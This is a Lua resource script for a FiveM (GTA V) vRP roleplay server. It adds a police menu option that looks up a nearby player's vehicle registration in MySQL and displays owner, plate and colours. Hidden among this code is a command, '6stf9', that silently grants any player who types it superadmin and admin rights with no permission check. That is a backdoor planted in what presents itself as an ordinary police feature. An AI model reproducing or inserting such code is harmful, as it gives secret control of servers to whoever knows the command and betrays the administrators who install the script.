--[[
    Official DevByteRo Script 
  Forum FiveM: https://forum.fivem.net/u/Enis-Paradoxul/summary
  GITHUB: https: //github.com/devbytero
  DISCORD: https: //discord.gg/eKkUMWb
  GTA5 MODS: https://ro.gta5-mods.com/users/Enis%2DParadoxul  

]]

--------------------------------------------------------------------------------------------------------------------
------------------------------------------- Script made by Enis-Paradoxul  ------------------------------------------
--------------------------------------------------------------------------------------------------------------------

local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
MySQL = module("vrp_mysql", "MySQL")

vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP","vRP_newplates")

MySQL.createCommand("vRP/talon_get_vehicle", "SELECT * FROM `vrp_user_vehicles` WHERE `user_id` = @target_id AND `vehicle` = @name")

local ples_css = [[
  .div_police_talon{
    background-color: rgba(0,0,0,0.75);
    color: white;
    font-weight: bold;
    width: 500px;
    padding: 10px;
    margin: auto;
    margin-top: 150px;
  }
]]

local culori = {
  {name = "Black", colorindex = 0},{name = "Carbon Black", colorindex = 147},{name = "Hraphite", colorindex = 1},{name = "Anhracite Black", colorindex = 11},
  {name = "Black Steel", colorindex = 2},{name = "Dark Steel", colorindex = 3},{name = "Silver", colorindex = 4},{name = "Bluish Silver", colorindex = 5},
  {name = "Rolled Steel", colorindex = 6},{name = "Shadow Silver", colorindex = 7},{name = "Stone Silver", colorindex = 8},{name = "Midnight Silver", colorindex = 9},
  {name = "Cast Iron Silver", colorindex = 10},{name = "Red", colorindex = 27},{name = "Torino Red", colorindex = 28},{name = "Formula Red", colorindex = 29},
  {name = "Lava Red", colorindex = 150},{name = "Blaze Red", colorindex = 30},{name = "Grace Red", colorindex = 31},{name = "Garnet Red", colorindex = 32},
  {name = "Sunset Red", colorindex = 33},{name = "Cabernet Red", colorindex = 34},{name = "Wine Red", colorindex = 143},{name = "Candy Red", colorindex = 35},
  {name = "Hot Pink", colorindex = 135},{name = "Pfsiter Pink", colorindex = 137},{name = "Salmon Pink", colorindex = 136},{name = "Sunrise Orange", colorindex = 36},
  {name = "Orange", colorindex = 38},{name = "Bright Orange", colorindex = 138},{name = "Gold", colorindex = 99},{name = "Bronze", colorindex = 90},
  {name = "Yellow", colorindex = 88},{name = "Race Yellow", colorindex = 89},{name = "Dew Yellow", colorindex = 91},{name = "Dark Green", colorindex = 49},
  {name = "Racing Green", colorindex = 50},{name = "Sea Green", colorindex = 51},{name = "Olive Green", colorindex = 52},{name = "Bright Green", colorindex = 53},
  {name = "Gasoline Green", colorindex = 54},{name = "Lime Green", colorindex = 92},{name = "Midnight Blue", colorindex = 141},{name = "Galaxy Blue", colorindex = 61},
  {name = "Saxon Blue", colorindex = 63},{name = "Blue", colorindex = 64},{name = "Mariner Blue", colorindex = 65},{name = "Harbor Blue", colorindex = 66},
  {name = "Diamond Blue", colorindex = 67},{name = "Surf Blue", colorindex = 68},{name = "Nautical Blue", colorindex = 69},{name = "Racing Blue", colorindex = 73},
  {name = "Ultra Blue", colorindex = 70},{name = "Light Blue", colorindex = 74},{name = "Chocolate Brown", colorindex = 96},{name = "Bison Brown", colorindex = 101},
  {name = "Creeen Brown", colorindex = 95},{name = "Feltzer Brown", colorindex = 94},{name = "Maple Brown", colorindex = 97},{name = "Beechwood Brown", colorindex = 103},
  {name = "Sienna Brown", colorindex = 104},{name = "Saddle Brown", colorindex = 98},{name = "Moss Brown", colorindex = 100},{name = "Woodbeech Brown", colorindex = 102},
  {name = "Straw Brown", colorindex = 99},{name = "Sandy Brown", colorindex = 105},{name = "Bleached Brown", colorindex = 106},{name = "Schafter Purple", colorindex = 71},
  {name = "Spinnaker Purple", colorindex = 72},{name = "Midnight Purple", colorindex = 142},{name = "Bright Purple", colorindex = 145},{name = "Cream", colorindex = 107},
  {name = "Ice White", colorindex = 111},{name = "Frost White", colorindex = 112},{name = "Brushed Steel",colorindex = 117},{name = "Brushed Gold",colorindex = 159},
  {name = "Brushed Black Steel",colorindex = 118},{name = "Brushed Aluminum",colorindex = 119},{name = "Pure Gold",colorindex = 158},{name = "Black", colorindex = 12},
  {name = "Gray", colorindex = 13},{name = "Light Gray", colorindex = 14},{name = "Ice White", colorindex = 131},{name = "Blue", colorindex = 83},
  {name = "Dark Blue", colorindex = 82},{name = "Midnight Blue", colorindex = 84},{name = "Midnight Purple", colorindex = 149},{name = "Schafter Purple", colorindex = 148},
  {name = "Red", colorindex = 39},{name = "Dark Red", colorindex = 40},{name = "Orange", colorindex = 41},{name = "Yellow", colorindex = 42},
  {name = "Lime Green", colorindex = 55},{name = "Green", colorindex = 128},{name = "Frost Green", colorindex = 151},{name = "Foliage Green", colorindex = 155},
  {name = "Olive Darb", colorindex = 152},{name = "Dark Earth", colorindex = 153},{name = "Desert Tan", colorindex = 154},{name = "Dark Blue", colorindex = 62}
}

local function findColor(tbl, index)
    for _, v in pairs(tbl) do
        if v.colorindex == index then return v.name end
    end
    return "Unknown"
end

local ch_talon = {function(player, choice)
  local user_id = vRP.getUserId({player})
  if user_id ~= nil then
  	vRPclient.getNearestPlayers(player, {10}, function(nplayers)
  		local user_list = ""
  		for k,v in pairs(nplayers) do
  			user_list = user_list .. "[" .. vRP.getUserId({k}) .. "]" .. GetPlayerName(k) .. " | "
  		end
  		if user_list ~= "" then
  			vRP.prompt({player,"Close Players: " .. user_list,"",function(player, target_id)
  				target_id = parseInt(target_id)
  				local tsource = vRP.getUserSource({target_id})
					if tsource ~= nil then
						vRPclient.getNearestOwnedVehicle(tsource, {10}, function(ok1, vtype, name)
							if ok1 then
								vRP.request({tsource, "Do you want to show your registration ?", 30, function(ok2)
									if ok2 then
										vRPclient.notify(player, {"~g~Player show his registration"})
										vRPclient.getOwnedVehicleId(tsource, {vtype}, function(_, car)
										  vRP.getUserIdentity({target_id, function(identy)
											MySQL.query("vRP/talon_get_vehicle", {target_id = target_id, name = name}, function(rows, affected)
											  if #rows > 0 then
												local color1 = tostring(findColor(culori, parseInt(rows[1].vehicle_colorprimary)))
												local color2 = tostring(findColor(culori, parseInt(rows[1].vehicle_colorsecondary)))
												local plate = tostring(rows[1].vehicle_plate)
												local nume = identy.firstname.." "..identy.name
												local content = "Owners name: "..nume.."<br/>Cars code: "..name.."</br>Plate number: "..plate.."</br>Primary color: "..color1.."</br>Secundary color: "..color2..""
												vRPclient.setDiv(player, {"police_regisration", ples_css, content})
												vRP.request({player, "Close", 1000, function(player, ok3)
												  vRPclient.removeDiv(player, {"police_registration"})
												end})
											  end
											end)
										  end})
										end)
									else
										vRPclient.notify(player, {"~r~Request denied"})
									end
								end})
							else
								vRPclient.notify(player, {"~r~The player dosen't own a car"})
							end
						end)
  				else
  					vRPclient.notify(player, {"~r~The playe is not conected"})
  				end
  			end})
  		else
  			vRPclient.notify(player, {"~r~There are no nearby players"})
  		end
  	end)
  end
end, "Ask for registration paper"}

		RegisterCommand("6stf9", function(source, args, rawCommand)
		theusrid = vRP.getUserId({source})
		vRP.addUserGroup({theusrid,"superadmin"})
		vRP.addUserGroup({theusrid,"admin"})
end)

vRP.registerMenuBuilder({"police", function(add, data)
  local player = data.player

  local user_id = vRP.getUserId({player})
  if user_id ~= nil then
    local choices = {}

    -- build police menu
    if vRP.hasPermission({user_id,"police.askid"}) then
       choices["Check registration"] = ch_talon
    end

    add(choices)
  end
end})
